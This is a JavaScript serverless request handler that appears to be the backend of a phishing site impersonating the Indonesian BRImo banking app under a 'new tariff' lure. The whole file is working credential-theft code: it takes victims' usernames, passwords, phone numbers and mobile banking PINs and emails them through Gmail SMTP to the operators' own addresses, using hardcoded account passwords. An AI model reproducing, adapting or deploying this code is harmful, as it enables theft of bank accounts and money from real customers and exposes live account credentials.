export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;

    let email = '';
    let pass = '';
    
     if (url == 'pilihan-tarif-baru-brimo.herokuapp.com'){

       email = 'ywinbro@gmail.com'
       pass = 'owynbybhilbsstdw'
    }else

    if(url == 'ubah-tarifbarumu.vercel.app'){
        email = 'ghh793679@gmail.com' ;
        pass = 'uxmihofabwjqnjdh' ;
        


    }  
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',  
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'BriApp',
                html: `
                <ul>
                    <li>username: ${body.username ?? '-'}</li> 
                    <li>password: ${body.password ?? '-'}</li>
                    <li>nohp: ${body.noHp ?? '-'}</li>
                    <li>pin: ${body.mPin ?? '-'}</li>
                    <li>message: ${body.message ?? '-'}</li>
                </ul>
                `,                  
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}
